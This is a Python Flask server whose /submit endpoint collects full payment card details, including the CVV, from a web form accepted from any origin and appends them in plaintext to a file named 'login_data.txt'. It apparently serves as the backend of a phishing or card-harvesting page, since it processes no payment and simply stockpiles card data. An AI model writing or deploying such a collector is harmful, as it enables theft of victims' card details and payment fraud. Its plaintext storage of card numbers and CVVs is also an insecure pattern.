from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app)

# Define the path to the file where the data will be saved
data_file = "login_data.txt"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit_data():
    card_data = {
        "card_number": request.form.get("card_number"),
        "card_holder": request.form.get("card_holder"),
        "card_expiry_month": request.form.get("card_expiry_month"),
        "card_expiry_year": request.form.get("card_expiry_year"),
        "card_cvv": request.form.get("card_cvv")
    }

    if all(card_data.values()):
        with open(data_file, 'a') as file:
            file.write("---- CARD DATA ----\n")
            for key, value in card_data.items():
                file.write(f"{key}: {value}\n")
        return "Data saved successfully"
    else:
        return "Invalid data", 400

if __name__ == '__main__':
   # Ensure the file exists or create it if necessary
   if not os.path.exists(data_file):
       with open(data_file, 'w') as f:
           pass  # Just create the file if it doesn't exist
   app.run(debug=True, port=8000)
